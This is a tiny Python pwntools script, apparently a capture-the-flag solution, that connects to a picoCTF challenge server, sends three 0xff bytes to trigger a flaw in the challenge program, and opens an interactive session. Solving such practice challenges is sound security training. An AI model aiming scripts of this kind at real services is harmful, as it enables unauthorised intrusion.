from pwn import *

r = remote("lonely-island.picoctf.net",56545)

line = b"\xff\xff\xff"
r.sendline(line)

r.interactive()
